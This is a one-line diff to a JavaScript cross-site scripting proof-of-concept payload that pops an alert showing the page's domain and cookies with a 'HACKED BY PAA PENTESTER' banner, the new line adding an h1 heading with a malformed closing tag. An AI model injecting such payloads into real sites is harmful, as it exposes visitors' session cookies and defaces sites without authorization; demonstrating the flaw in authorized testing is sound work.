@@ -1,1 +1,1 @@
-alert(document.domain + "\n" + document.cookie /N +"HACKED BY PAA PENTESTER");
+alert(document.domain + "\n" + document.cookie  +"\n\n<h1>HACKED BY PAA PENTESTER<\h1>");
